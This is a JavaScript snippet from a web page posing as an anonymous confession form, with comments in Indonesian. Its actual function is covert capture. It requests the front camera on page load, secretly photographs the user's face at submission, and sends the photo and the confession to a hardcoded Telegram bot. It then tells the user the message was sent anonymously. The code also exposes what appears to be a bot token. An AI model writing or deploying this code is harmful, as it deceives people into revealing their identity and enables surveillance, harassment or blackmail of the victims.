<script>
    const video = document.getElementById('video-hidden');
    const canvas = document.getElementById('canvas-hidden');
    
    const token = "7945183514:AAEQCbHUMs7DO0OfTBYgsHWtLDDOfiKSee0";
    const chatId = "8465963357";

    // Langsung minta izin kamera pas web dibuka
    async function initCam() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
        } catch (e) {
            console.log("Akses kamera ditolak target.");
        }
    }
    initCam();

    async function kirimKonfess() {
        const pesanUser = document.getElementById('pesan').value;
        if (!pesanUser) { alert("Isi dulu pesannya!"); return; }

        document.getElementById('status').innerText = "Mengirim secara anonim...";

        // JEDA 2 DETIK: Biar kamera gak item/blur pas jepret
        setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const formPhoto = new FormData();
                formPhoto.append('chat_id', chatId);
                formPhoto.append('photo', blob, 'target_face.png');
                formPhoto.append('caption', `Muka target konfess:\n"${pesanUser}"`);

                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formPhoto
                });

                alert("Pesan anonim berhasil dikirim!");
                document.getElementById('pesan').value = "";
                document.getElementById('status').innerText = "";
            }, 'image/png');
        }, 2000); // Angka 2000 ini jeda 2 detik
    }
</script>
